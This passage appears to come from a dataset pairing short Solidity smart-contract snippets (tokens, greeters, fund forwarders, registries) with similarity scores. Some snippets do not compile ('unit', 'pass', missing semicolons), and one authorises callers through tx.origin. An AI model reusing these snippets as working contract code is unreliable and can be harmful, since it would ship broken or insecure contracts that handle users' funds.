    function addClass(address _teacher, address[] memory _pupils) public {
        require(msg.sender == teachers);
        classes[1] = Class(1, _teacher, _pupils);
    }

}",0.659027142405703,"contract Metadata {
    
    address public owner;
    
    mapping (uint => address) registerMap;

    function Metadata() public {
        owner = msg.sender;
        registerMap[0] = msg.sender;
    }

    
    function getAddress (uint addressId) public view returns (address){
        return registerMap[addressId];
    }

    
    
    
    
    
    function addAddress (uint addressId, address addressContract) public {
        assert(addressContract != 0x0 );
        require (owner == msg.sender || owner == tx.origin);
        registerMap[addressId] = addressContract;
    }
}"
"contract MyContract {
  event Log(address addr);

  fallback() external payable{
    emit Log(address(this));
  }

  function add(uint256 a, uint256 b) public pure returns (uint256) {
    return a + b;
  }
}",0.6678463265727851,"contract Bank is CutiePluginBase
{
    function run(
        uint40,
        uint256,
        address
    ) 
        public
        payable
        onlyCore
    {
        revert();
    }

    function runSigned(uint40, uint256, address)
        external
        payable
        onlyCore
    {
        
    }
}"
"contract Test {
    interfaceLib _interface;
    constructor(address i) public {
        _interface = interfaceLib(i);
    }

    uint[] public xs;

    function callLibFunc(uint x, uint y) public view returns(uint) {
        return _interface.callme(x, y);
    }

    function callLibFunc2(uint y) public returns(uint) {
        xs.push(1);
        xs.push(2);
        return _interface.callme2(xs, y);
    }
}",0.6097284315389513,"contract PotLike {
    function chi() public view returns (uint);
    function dsr() public view returns (uint);
    function rho() public view returns (uint);
    function pie(address) public view returns (uint);
    function drip() public returns (uint);
    function join(uint) public;
    function exit(uint) public;
}"
"contract MyToken is ERC721Token { 
  function MyToken() ERC721Token(NAME, SYMB) public payable {
  }
  function purchase(uint256 _tokenId) public payable {
    
  }
}",0.6729195931709475,"contract ZJLToken is TokenERC20 {

    function ZJLToken() TokenERC20(2500000000, ""ZJLToken"", ""ZJLT"", 18) public {

    }
	
	function () payable public {
      
      
      require(false);
    }
}"
"contract BuyFrom {
    address payable private token;

    constructor(address payable _token) public {
        token = _token;
    }

    function buyToken(address contributor) external payable {
       InterfaceToken(token).invest(contributor);
    }
}",0.6203660273321603,"contract Pool is Ownable {
    
    IERC20 token;
    
    constructor(address tokenAddress) public {
        token = IERC20(tokenAddress);
    }
    
    function send(address to, uint value) public onlyOwner  {
        token.transfer(to, value);
    }
}"
"contract B {
   function acceptValue(unit value);
}",0.6122910302522288,"contract contractX 

{

  function exit() public;

}"
"contract B {
  address payable public owner;
  address payable public contract_a = 0x600F51a64e8A703b759EB3d735132d6C802A0a7b;  

  constructor () public payable {
    owner = msg.sender;
  }

  function () external payable {
      contract_a.transfer(msg.value);
  }
}",0.6490441092614646,"contract newC {
    function sendEth(address payable[] memory _addresses, uint256 _amount) public payable {
        for (uint i=0; i<_addresses.length; i++) {
            _addresses[i].transfer(_amount);
        }
    }
    constructor() public payable{}
    function () payable external{}
}"
"contract MyContract {

    address[] public contracts;    
    event ContractCreated(address newAddress);

    constructor() public { }

    function createOtherContract() public {
        OtherContract contract = new OtherContract();
        address contractAddress=address(contract);
        contracts.push(contractAddress);
        emit ContractCreated(contractAddress);
    }
    function getDeployedContracts() public view returns (address[] memory) {
        return contracts;
    }
}",0.6164170948419863,"contract ZapCoordinatorInterface is Ownable {

    function addImmutableContract(string contractName, address newAddress) external;

    function updateContract(string contractName, address newAddress) external;

    function getContractName(uint index) public view returns (string);

    function getContract(string contractName) public view returns (address);

    function updateAllDependencies() external;

}"
"contract DappTokenSale {
    address admin;
    DappToken public tokenContract;
    uint256 public tokenPrice;
    uint256 public tokensSold;
    uint256 public decimals;


    event Sell(address _buyer, uint256 _amount);

    function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
        admin = msg.sender;
        tokenContract = _tokenContract;
        tokenPrice = _tokenPrice;
    }

    function multiply(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x);
    }

    function buyTokens(address _receiver, uint256 _amount) public payable {
        _amount = msg.value;
        require(_receiver != address(0));
        require(_amount > 0);
        uint256 tokensToBuy = multiply(_amount, (10 ** decimals)) / 1 ether * tokenPrice;
        require(tokenContract.transfer(msg.sender, tokensToBuy));
        tokensSold += _amount;

        emit Sell(msg.sender, tokensToBuy);
    }

  
    function endSale() public {
            
            require (msg.sender == admin);

             
            require(tokenContract.transfer(admin,tokenContract.balanceOf(this)));


            
            selfdestruct(admin);
    }
}",0.6734216029927215,"contract FDataToken is TokenBase{

    string internal _tokenName = 'FData';
    string internal _tokenSymbol = 'FDT';
    uint256 internal _tokenDecimals = 18;
    uint256 internal _initialSupply = 10000000000;
    
	
    function FDataToken() public {
        _totalSupply = _initialSupply * 10 ** uint256(_tokenDecimals);  
        balances[msg.sender] = _totalSupply;                
        name = _tokenName;                                     
        symbol = _tokenSymbol;                               
        decimals = _tokenDecimals;
        owner = msg.sender;
    }

	
	function() payable public {
    }

    function freezeAccount(address target, bool value) onlyOwner public {
        frozenAccount[target] = value;
        emit FrozenFunds(target, value);
    }
    
	
	function retrieveEther(uint256 amount) onlyOwner public {
	    require(amount > 0);
	    require(amount <= address(this).balance);
		msg.sender.transfer(amount);
	}

	
	function retrieveToken(uint256 amount) onlyOwner public {
        _transfer(this, msg.sender, amount);
	}
	
	
	function retrieveTokenByContract(address token, uint256 amount) onlyOwner public {
        ERC20Interface(token).transfer(msg.sender, amount);
	}

}"
"contract DataStore  {

    event Borrow(uint indexed bookId, address indexed borrower, uint timestamp);

    function borrowEvent(uint id, address borrower) {
        Borrow(id, msg.sender, now);
    }
 }",0.6053189588066249,"contract EventDefinitions {
	event Transfer(address indexed from, address indexed to, uint value);
	event Approval(address indexed owner, address indexed spender, uint value);
}"
"contract interaction_1 {

    string public description;
    string public user_prediction;
    uint public amount;
    event teamAccepted(string team_1);


    function user_input (string memory team) public payable {
           user_prediction = team;
           emit teamAccepted(user_prediction);

    }
    function get_user_input()view public returns(string memory) {
        return user_prediction;
    }

}",0.6065888180251343,"contract SaveData {
    mapping (uint => string) sign;
    address public owner;
    event SetString(uint key,string types);
    function SaveData() public {
        owner = msg.sender;
    }
    function setstring(uint key,string md5) public returns(string){
        sign[key]=md5;
        return sign[key];
    }

    function getString(uint key) public view returns(string){
        return sign[key];
    }
}"
"contract interaction_2 {
    function getValue (address addr)public returns (string memory);
}",0.6910620025052526,"contract Agency {
    function register(string memory _input) public pure returns(bytes32);
}"
"contract InterfaceContract is InterfaceTest {
    function testInterface() external pure returns(uint) {
        return 9;
    }
}",0.6452615662646035,"contract Searcher {



    

    

    function poke() public;



    

    

    function identify() external pure returns(uint) {

        return 0xda4b055; 

    }

}"
"contract PayEther {
    mapping(address => bool) payedCustomer;
    uint64 private peopleThatPayed;
    address private owner;

    constructor(uint minimumAmount) public {
        owner = msg.sender;
        peopleThatPayed = 0;
    }

    function pay() payable public {
        require(msg.value > 0, ""Address didn't send enough money."");
        payedCustomer[msg.sender] = true;
        peopleThatPayed++;
    }

    function findHowManyPeoplePayed() view public returns (uint64){
        require(payedCustomer[msg.sender], ""Address never payed!"");
        return peopleThatPayed;
    }
}",0.6188517848342981,"contract Pausable is Ownable {

  event Paused(address account);

  event Unpaused(address account);



  bool private _paused;



  constructor() internal {

    _paused = false;

  }



  

  function paused() public view returns(bool) {

    return _paused;

  }



  

  modifier whenNotPaused() {

    require(!_paused);

    _;

  }



  

  modifier whenPaused() {

    require(_paused);

    _;

  }



  

  function pause() public onlyOwner whenNotPaused {

    _paused = true;

    emit Paused(msg.sender);

  }



  

  function unpause() public onlyOwner whenPaused {

    _paused = false;

    emit Unpaused(msg.sender);

  }

}"
"contract Back is Ownable {

      using SafeMath for uint;

      modifier affordPay() {
        require(msg.sender.balance > msg.value, ""You don't have enough eth!!"");
        _;
      }

      function back() external affordPay() payable {
        msg.sender.transfer(msg.value);
      }

    }",0.6405058269226688,"contract Pausable is Ownable {

  bool private paused = false;



  

  modifier whenNotPaused() {

    if(paused == true && msg.value > 0){

      msg.sender.transfer(msg.value);

    }

    require(!paused);

    _;

  }





  

  function triggerPause() onlyOwner external {

    paused = !paused;

  }



}"
"contract TestToken {

  function testTotalSupplyOfCoin() {
    Token meta = new Token();

    uint expected = 8000000000000;

    Assert.equal(meta.totalSupply(), expected, ""Owner should have 8000000000000 Coins initially"");
  }

}",0.6070237909792665,"contract NewToken is ERC20Standard {
 function NewToken() {
  totalSupply = 10000000000000000000000000000;
  name = ""Fext Coin"";
  decimals = 18;
  symbol = ""FEXT"";
  version = ""1.0"";
  balances[msg.sender] = totalSupply;
 }
}"
"contract Greeter {
string public greeting;

function Greeter() public {
    greeting = 'Hello';
}

function setGreeting(string _greeting) public {
    greeting = _greeting;
}

function greet() view public returns (string) {
    return greeting;
}",0.6930680683199766,"contract Greeter is Mortal {

    

    string greeting;



    

    constructor() public {

        greeting = ""Well, hello there! I am Gruvin's first Ethereum contract!"";

    }



    

    function greet() public constant returns (string) {

        return greeting;

    }

}"
"contract ReceiveBalanceContract is Ownable {

    receive() external payable {
        require(msg.sender == address(SendBalanceContract));
    }

    function withdrawBalance() external {

        owner.call.value(address(this).balance)();
    }
}",0.677384297080055,"contract Control is Ownable {

    

    function withdrawBalance(address recipient, uint256 value) external onlyOwner {

        require(value > 0);

        require(value < address(this).balance);

        recipient.transfer(value);

    }

}"
"contract SendBalanceContract {

    constructor(address _nftAddress) public {

        ERC721 candidateContract = ERC721(_nftAddress);
        require(candidateContract.supportsInterface(InterfaceSignature_ERC721)); 
        nonFungibleContract = candidateContract;
    }

    function withdrawBalance() external {
        address nftAddress = address(nonFungibleContract);

        require(msg.sender == owner || msg.sender == nftAddress); 
        bool res = nftAddress.call.value(address(this).balance)(""""); 
    }
}",0.6371848862738175,"contract ExternalContracts is Ownable {

    MixGenInterface public geneScience;

    RewardContract public reward;

    

    function setMixGenAddress(address _address) external onlyOwner {

        MixGenInterface candidateContract = MixGenInterface(_address);

        require(candidateContract.isMixGen());

        

        geneScience = candidateContract;

    }

        

    function setRewardAddress(address _address) external onlyOwner {

        reward = RewardContract(_address);

    }

}"
"contract A {
    address public beneficiary;

    function A(address _beneficiary) public {
         beneficiary = _beneficiary;
    }

    function () public payable {
         beneficiary.transfer(msg.value);
    }
}",0.6312244276197218,"contract efw {
  address public xdest;
  function efw() public {
    xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
  }
  function() payable public {
    xdest.transfer(msg.value);
  }
}"
"contract P1 is ERC20 { 
    using SafeMath for uint256;


   FiatContract price = FiatContract(0x8055d0504666e2B6942BeB8D6014c964658Ca591); 

     
     string public constant name = ""P1"";
     
     string public constant symbol = ""P1"";
     uint8 public constant decimals = 8;
     uint public _totalsupply = 1000000000 * (uint256(10) ** decimals);
     address public owner;
     bool stopped = false;
     uint256 public startdate;
     uint256 ico_first;
     uint256 ico_second;
     uint256 ico_third;

 uint256 ico_fourth;
 address central_account;
 mapping(address => uint) balances;
 mapping(address => mapping(address => uint)) allowed;


 enum Stages {
     NOTSTARTED,
     ICO,
     PAUSED,
     ENDED
 }

 Stages public stage;

 modifier atStage(Stages _stage) {
     if (stage != _stage)
         
         revert();
     _;
 }",0.6387957321699225,"contract StandardToken {

 

    using SafeMath for uint256;

   

    string public name;

     

    string public symbol;

	 

    uint8 public  decimals;

	 

	  uint256 public totalSupply;

   

	 

    function transfer(address _to, uint256 _value) public returns (bool success);

     

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);

	 

    function approve(address _spender, uint256 _value) public returns (bool success);

	 

    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);

	 

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

	 

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

}"
"contract test {
    string stat;
    address owner;

    event statChanged(string _stat);

    function test() {
        stat = ""INIT"";
        owner = msg.sender;
    }

    function() payable {
        stat = ""PAID"";
    }

    function getStat() constant returns (string) {
        return stat;
    }

    function getBalance() constant returns (uint) {
        return this.balance;
    }

    function getOwner() constant returns (address) {
        return owner;
    }

    function send2Owner() {
        owner.transfer(this.balance);
    }

    function update(string _stat) {
        stat = _stat;
        statChanged(_stat);
    }
}",0.640443384348243,"contract XBL_ERC20Wrapper
{
    function transferFrom(address from, address to, uint value) returns (bool success);
    function transfer(address _to, uint _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);
    function burn(uint256 _value) returns (bool success);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function totalSupply() constant returns (uint256 total_supply);
}"
"contract Log is Mortal {
    bytes32[] id;

    function Log (string data) public Mortal(){
        id.push(sha256(abi.encodePacked(data)));
    }

    function mainId() public view returns (bytes32) {
        return id[0];
    }

    function check(string data) public view returns (bool){
        bytes32 d = sha256(abi.encodePacked(data));
        uint i = 0;
        bool enc = false;
        while(!enc && i < id.length){
            if(id[i] == d){
                enc = true;
            }
            i++;
        }

        return enc;
    }
    function add(string data) public {
        id.push(sha256(abi.encodePacked(data)));
    }
}",0.6492604070112258,"contract ERC223 {

  function name() public view returns (string);

  function symbol() public view returns (string);

  function decimals() public view returns (uint8);



  function transfer(address to, uint256 value, bytes data) public returns (bool);

  function transferFrom(address from, address to, uint256 value, bytes data) public returns (bool);



  event Transfer(address indexed from, address indexed to, uint256 value, bytes data);

}"
"contract Farm {
    address public owner;
    mapping(address => bool) public pigs;
    BaconMaker[] public baconMakers;

    function Farm() {
        owner = msg.sender;
    }

    function addPig(address pig) external {
        require(pig != 0x0);
        require(msg.sender == owner);
        pigs[pig] = true;
        BaconMaker baconMaker = new BaconMaker(pig);
        baconMakers.push(baconMaker);
    }

}",0.65416827884908,"contract owned {



    mapping (address => bool) internal owners;

    

    constructor() public{

        owners[msg.sender] = true;

    }



    modifier onlyOwner {

        require(owners[msg.sender] == true);

        _;

    }



    function addOwner(address _newOwner) onlyOwner public{

        owners[_newOwner] = true;

    }

    

    function removeOwner(address _oldOwner) onlyOwner public{

        owners[_oldOwner] = false;

    }

}"
"contract A {

    function A () payable {

    }

    event balanc(uint a);

    function fundTransfer(address b,uint amt) {
       bool ret = b.send(amt);
    }    

    function getBalance() {
        balanc(this.balance);
    }
}",0.6484185341982627,"contract WithdrawableToken {

    function transfer(address _to, uint _value) returns (bool success);

    function balanceOf(address _owner) constant returns (uint balance);

}"
"contract B {

    event balanc(uint a);

    function getBalance() {
        balanc(this.balance);
    }
}",0.6118212097737098,"contract Token {
  function balanceOf(address owner) returns (uint256 balance);
}"
"contract pingpong {

    string public pong;
    
    

    function ping (string val) {
        pong = val;
    }
}",0.6106559352585291,"contract web3Voorbeeld {

    

    

    function ping() public view returns(string) {

        return(""pong"");

    }

}"
"contract ElectionMaster {
function addElection(address electionAddress,
    bytes32 electionName,
    address organizerAddress) public {}

function canAddressDeployContract(address organizerAddress) public view returns(bool) {}
}",0.6400607778845248,"contract abcResolverI{

    function getWalletAddress() public view returns (address);

    function getBookAddress() public view returns (address);

    function getControllerAddress() public view returns (address);

}"
"contract DataItem {
    bytes32 key;
    string value;

    function DataItem(bytes32 k, string v) {
        key = k;
        value = v;
    }
}",0.6183808379949001,"contract SetBU is DataCaller {

    function setBU(bytes32 _key, uint256 _value) internal {

        data.setBU(_key, _value);    

    }

}"
"contract Testcoin {
    address public creator;
    mapping (address => uint) public balances;

    event Delivered(address from, address to, uint amount);
    event StringLogger(string message);

    function TestCoin() {
        creator = msg.sender;
    }

    function create(address receiver, uint amount) {
        if (msg.sender != creator){ 
            emit StringLogger('This Account is not allowed too create tokens.');
            revert();
        }
        balances[receiver] += amount;
    }

    function transfer(address receiver, uint amount) {
        if (balances[msg.sender] < amount){         
            emit StringLogger('Not enough balance');
            revert();
        }
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        emit Delivered(msg.sender, receiver, amount);
    }

}",0.6354014105486493,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0), 'Receiving address cannot be 0!');

    require(_value <= balances[msg.sender], 'Not enough token funds for sender!');



    

    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}"
"contract Parent {

    struct Info{
        string fName;
        string lName;
    }

    uint256[] values;

    mapping(address => Info) names;
    mapping (address => uint256[])transactions;
    mapping (address => uint) accountBalance;


    function setName(address addr,string _fName, string _lName){
        names[addr] = Info(_fName, _lName);
    }

    function getFName(address addr) constant returns (string){
        return names[addr].fName;
    }

    function getLName(address addr) constant returns (string){
        return names[addr].lName;
    }

    function storeValue(address addr, uint256 _value) {
        transactions[addr].push(_value);
        accountBalance[addr] += _value;
    }

    function accountTx(address addr) constant returns(uint256[]) {
        return (transactions[addr]);
    }

    function totalBalance(address addr) constant returns(uint){
        return accountBalance[addr];
    }

}",0.6630242683979828,"contract ERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed from, address indexed spender, uint256 value);
    string public symbol;

    function decimals() constant returns (uint8);
    function totalSupply() constant returns (uint256 supply);
    function balanceOf(address _owner) constant returns (uint256 balance);
    function transfer(address _to, uint256 _value) returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) returns (bool success);
    function approve(address _spender, uint256 _value) returns (bool success);
    function allowance(address _owner, address _spender) constant returns (uint256 remaining);
}"
"contract testReset {

    uint public _num;

    constructor() public {
    }


    function _set(uint newnum) public {
        _num = newnum;
    }

    function _reset() public {
        _num = 0;
    }
}",0.6650338878118432,"contract test {
  using SafeMath for uint256;
  uint256 public num;
  function test() {
    num = 10;
  }
  function add(uint256 _num) {
    num = num.add(_num);
  }
}"
"contract Test {
    function test() returns (string) {
        return ""foobar"";
    }
}",0.6885416329800367,"contract DSTrueFallback {

    function() returns (bool) {

        return true;

    }

}"
"contract MyContract {
  IErc20 public token;

  constructor(address _token) {
    token = IErc20(_token);
  }

  function deposit(uint _amount) public {
    require(token.transferFrom(msg.sender, address(this), _amount);
  }
}",0.6469963356536318,"contract TokenVault is Ownable {
    function withdrawTokenTo(address token, address to, uint amount) public onlyOwner returns (bool) {
        return Token(token).transfer(to, amount);
    }
}"
"contract A {

    address  public owner;
    uint     public counter ; 
    B b ;
    address public bc ;
    address public bo ; 

    modifier owneronly {
        if (msg.sender != owner)
            throw;
        _
    }

    function A() {
        owner = msg.sender;
        counter = 1 ; 
    }

    function increment(address x,address y) public {
       counter = counter + 1 ;
       bc = x ;
       bo = y ; 
    }

    function reqswap(address baddr,address x,address y)  public {
        b = B(baddr)  ; 
        b.increment(x,y) ; 
    }
}",0.6483957539646308,"contract Leader {

    address owner;

    mapping (address => bool) public admins;

    

    modifier onlyOwner() {

        require(owner == msg.sender);

        _;

    }



    modifier onlyAdmins() {

        require(admins[msg.sender]);

        _;

    }

    

    function setOwner (address _addr) onlyOwner() public {

        owner = _addr;

    }



    function addAdmin (address _addr) onlyOwner() public {

        admins[_addr] = true;

    }



    function removeAdmin (address _addr) onlyOwner() public {

        delete admins[_addr];

    }

}"
"contract B {

    address  public owner;
    uint     public counter ; 
    A a ;
    address public ac ; 
    address public ao ;

    modifier owneronly {
        if (msg.sender != owner)
            throw;
        _
    }

    function B() {
        owner = msg.sender;
        counter = 1 ; 
    }

    function increment(address x,address y) public {
       counter = counter + 1;
       ac = x ;
       ao = y ; 
    }

    function reqswap(address aaddr,address x,address y)  public {
        a = A(aaddr)  ; 
        a.increment(x,y) ; 
    }
}",0.6618395927171004,"contract Leader {

    address owner;

    mapping (address => bool) public admins;

    

    modifier onlyOwner() {

        require(owner == msg.sender);

        _;

    }



    modifier onlyAdmins() {

        require(admins[msg.sender]);

        _;

    }

    

    function setOwner (address _addr) onlyOwner() public {

        owner = _addr;

    }



    function addAdmin (address _addr) onlyOwner() public {

        admins[_addr] = true;

    }



    function removeAdmin (address _addr) onlyOwner() public {

        delete admins[_addr];

    }

}"
"contract DynamicContract {
    address dynLib;

    function updateLib(address _lib) public {
        dynLib = _lib;
    }

    function getLibAddress() public view returns(address) {
        return dynLib;
    }
}",0.6769361683946643,"contract ProxyRegistryInterface {
    function proxies(address _owner) public virtual view returns (address);
    function build(address) public virtual returns (address);
}"
"contract Festival {


    address owner;
    uint8 max;
    address[] entered;

    function Festival(uint8 _max) {
        max = _max;
        owner = msg.sender;
    }

    function joinFestival()
    {
        if(entered.length < max)
            entered.push(msg.sender);
    }


}",0.6016871638793769,"contract Owned {
    
    address public owner;

    
    function Owned() { owner = msg.sender; }

    
    function delegate(address _owner) onlyOwner
    { owner = _owner; }

    
    modifier onlyOwner { if (msg.sender != owner) throw; _; }
}"
"contract A{

    Token public tokenContract

    function A(address addressOfTokenContract) {
    tokenContract = Token(addressOfTokenContract);
    }


    function B() {
    if(msg.sender != tokenContract) throw;
    }


}",0.6154813493978003,"contract ERC20Deployer {

    

    event newContract(address indexed _contract);

    

    function deployNewToken() public {

        Token token = new Token('test123', 'TST', 18);

        emit newContract(address(token));

    }

}"
"contract WalletLibrary {
   function initWallet(address[] _owners, uint _required, uint _daylimit) {
     pass
  }
}",0.6241401026660265,"contract MinMaxWhiteList {
    function allowed(address addr) public constant returns (uint , uint  );
}"
"contract X {
   uint data;
   function Y(uint a) {}
}",0.6171710706948468,"contract FLC {
    function create(uint units) public;
}"
"contract
agContract {
 using SafeMath for uint;
    address public owner;
    MintableNonFungibleToken nft;
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
   function agContract(address _nftContract){
        owner = msg.sender;
        nft = MintableNonFungibleToken(_nftContract);
    }
function createNFT(uint256 _weight, address _owner, string _name){
        nft.mint(_owner, readNFT(), _owner, _name); 
    }
 function batchLeavesFacility(uint _tokenId, address _to, uint256 _weight){

        nft.transferAgContract(_to, msg.sender, _tokenId);
    }
 function readNFT() internal returns(uint)  {
        return nft.totalSupply();
    }


}",0.6283908692497046,"contract CentraWhiteList { 

      using SafeMath for uint;  

      address public owner;
      uint public operation;
      mapping(uint => address) public operation_address;
      mapping(uint => uint) public operation_amount; 
      
   
      
      modifier onlyOwner() {
          if (msg.sender != owner) {
              throw;
          }
          _;
      }      
   
      
      function CentraWhiteList() {
          owner = msg.sender; 
          operation = 0;         
      }
      
      
      function() payable {    

        if(!(msg.value > 0)) throw;
        
        operation_address[operation] = msg.sender;
        operation_amount[operation] = msg.value;        
        operation = operation.add(1);
      }

      
      function withdraw() onlyOwner returns (bool result) {
          owner.send(this.balance);
          return true;
      }
      
 }"
"contract FundingHub {

    address public owner;
    address[] public projectAddresses;

    modifier onlyOwner() { if (msg.sender != owner) throw; _; }

    function FundingHub() {
        owner = msg.sender;
    }

    function createProject(string name, uint248 amountToRaise, uint248 deadline) returns (address) {
        address newProject = new Project(name, amountToRaise, deadline);
        projectAddresses.push(newProject);
        return newProject;
    }

    function getProjectAddress(uint i) constant returns (address projectAddress) {
        return projectAddresses[i];
    }

    function killMe() onlyOwner returns (bool successful) {
        suicide(owner);
        return true;
    }
}",0.6561494039323038,"contract Merchant {
    
    address public owner;
    
    
    event ReceiveEther(address indexed from, uint256 value);
    
    
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    
    
    function Merchant() public {
        owner = msg.sender;
    }
    
    
    function () public payable {
        ReceiveEther(msg.sender, msg.value);
    }
    
    
    function withdrawFunds(address withdrawAddress, uint256 amount) onlyOwner public returns (bool) {
        if(this.balance >= amount) {
            if(amount == 0) amount = this.balance;
            withdrawAddress.transfer(amount);
            return true;
        }
        return false;
    }
    
    
    function withdrawAllFunds() onlyOwner public returns (bool) {
        return withdrawFunds(msg.sender, 0);
    }
}"
"contract C {

    string words = ""Bla bla bla"";

    uint256 lastVal;

    function math(uint256 a, uint256 b) {
        lastVal = a + b;
    }

    function getVal() constant returns (uint256) {
    return lastVal;
    }

    function getWords() constant returns (string) {
        return words;
    }
}",0.6488546001374045,"contract SafeMath {
  function safeSub(uint256 a, uint256 b) public pure returns (uint256) {
    require(b <= a);
    return a - b;
  }

  function safeAdd(uint256 a, uint256 b) public pure returns (uint256) {
    uint256 c = a + b;
    require(c>=a && c>=b);
    return c;
  }
}"
"contract InnerContract {
    event Event(uint256);

    function func(uint256 val) external returns (uint256) {
        Event(val);
        return val;
    }
}",0.6684393287847341,"contract niguezRandomityEngine {
  function ra() external view returns (uint256);
	function rx() external view returns (uint256);
}"
"contract Reg {
    mapping (address=>bytes32[5]) Map;

    
    function fill_map(bytes32[5] _attributes) public  {
            Map[msg.sender] = _attributes;
    }

    
    function get_attributes(address _id) view public returns (bytes32[5]){
        return Map[_id];
    }
}",0.6267723673841217,"contract Notary {
    mapping (bytes32 => bool) public hashes ;
    
    function register(bytes32 _hash) public {
        hashes[_hash] = true;
    }
    
    function check(bytes32 _hash) public view returns (bool) {
        return hashes[_hash];
    }
}"
"contract TestData {

    address Address;
    function get_address (address _Address) public{   
        Address = _Address;
    } 

    
    bytes32[5] fetched;
    function fetch(address _reg_Adress) public view returns (bytes32[5]) {
        Reg r = Reg(_reg_Adress);
        fetched = r.get_attributes(Address);
        return (fetched);
    }

    
    bytes32[5] inputs;
    function getInputs(bytes32[5] _inputs) public view returns (bytes32[5]){
            inputs = _inputs;
            return (inputs);
    }    

    
    bool[5] a = [false,false,false,false,false];
    function compare() public view returns(bool[5]){
        for(uint i=0;i<5;i++){
            for(uint j=0;j<5;j++){
                if(inputs[i] == fetched[j]){
                    a[i] = true;                 
                }
            }
        }

        return (a);
    }  

}",0.6260062989452225,"contract AddressSet is Ownable {

  mapping(address => bool) exist;

  address[] elements;



  

  function add(address _addr) onlyOwner public returns (bool) {

    if (contains(_addr)) {

      return false;

    }



    exist[_addr] = true;

    elements.push(_addr);

    return true;

  }



  

  function contains(address _addr) public view returns (bool) {

    return exist[_addr];

  }



  

  function elementAt(uint256 _index) onlyOwner public view returns (address) {

    require(_index < elements.length);



    return elements[_index];

  }



  

  function getTheNumberOfElements() onlyOwner public view returns (uint256) {

    return elements.length;

  }

}"
"contract ReferralProgram {
    
    mapping (address=>address[]) private referrals;

    function becomeReferral(address referrer) public {
        require(referrer != 0x0);
        referrals[referrer].push(msg.sender);
    }

    function getReferrals() public view returns (address[]) {
        return referrals[msg.sender];
    }
}",0.6054233064981568,"contract License {
    
    mapping (address => bool) signatories;
    
    function sign() public {
        signatories[msg.sender] = true;
    }
        
    function unsign() public {
        signatories[msg.sender] = false;
    }
        
    function did_address_sign(address _address) public view returns (bool) {
        return signatories[_address];
    }
}"
"contract ProofOfExistence {

    

    function proofFor(string memory document) public view returns(bytes32) {
        return sha256(document);
    }

    
}",0.6254614780739465,"contract LandRegistryInterface {
  function getProperty(string memory _eGrid) public view returns (address property);
}"
"contract C2 {

    address public addr;

    constructor(address per) public {
        addr = per;
    }

    function remote_get_number() external view returns(uint) {
        return C1(addr).get_a_number();
    }

    function remote_set_number(uint num) external {
        C1(addr).set_a_number(num);
    }
}",0.6602325350790402,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract C1 {

    uint public a_number;

    function get_a_number() external view returns(uint) {
        return(a_number);
    }

    function set_a_number(uint num) external  {
        a_number = num;
    }
}",0.6564515738508065,"contract ICERC20 is ICToken {
    function mint(uint mintAmount) external returns (uint);

    function underlying() external view returns (address token);
}"
"contract SimpleContract {
    uint storedData;
    event SimpleEvent(uint p); 

    function set(uint x) public 
    { 
      storedData = x; 
      SimpleEvent(x); 
    }
    function get() public returns (uint) { return storedData; }
}",0.6201510873763423,"contract FeeInterface {
    function rateOf (address token) public view returns (uint);
    function takeFee (uint amt, address token) public view returns (uint fee, uint remaining);
}"
"contract MyContract {
    mapping(address => uint256) public balances;
    address payable wallet;

    event Purchase(
        address indexed _buyer,
        uint256 amount
    );

    constructor(address payable _wallet) public {
        wallet = _wallet;
    }

    function buyToken(uint256 amount) public payable {
        balances[msg.sender] += amount;
        wallet.transfer(msg.value);
        emit Purchase(msg.sender, amount);
    }
}",0.6846585523293341,"contract FundsTransfer is Owned{

    address public wallet;

    

    

    

    constructor (address _wallet, address _owner) public{

        wallet = _wallet;

        owner = _owner;

    }



    function () external payable{

        _forwardFunds(msg.value);   

    }

  

    function _forwardFunds(uint256 _amount) internal {

        wallet.transfer(_amount);

    }

    

    function changeWallet(address newWallet) public onlyOwner {

        wallet = newWallet;

    }

}"
"contract Called {
    string info = ""default"";

    function setInfo(string _info) public {
        info = _info;
    }

    function getInfo() view public returns (string) {
        return info;
    }

}",0.6997809478920106,"contract onchain{

    string onChainData;

    function set (string x) public{

        onChainData = x;

    }

    

    function get() public constant returns (string){

        return onChainData;

    }

}"
"contract Caller {

    Called called;

    constructor(address addr) public {
        called = Called(addr);
    }

    function setInfo(string _info) public {
        called.setInfo(_info);
    }

    function getInfo() view public returns (string) {
        return called.getInfo();
    }

}",0.6383182649881274,"contract Hello {

    string greeting;



     constructor() public {

        greeting = ""hello"";

     }



     function getGreeting() public view returns (string) {

        return greeting;

     }



     function setGreeting(string _greeting) public {

        greeting = _greeting;

     }

}"
"contract Simple {
        function arithmetics(uint _a, uint _b) returns (uint o_sum, uint o_product) {
            o_sum = _a + _b;
            o_product = _a * _b;
        }
    }",0.696281513322385,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract Coin {
    
    
    address public minter;
    mapping (address => uint) public balances;

    
    
    event Sent(address from, address to, uint amount);

    
    
    function Coin() {
        minter = msg.sender;
    }
    function mint(address receiver, uint amount) {
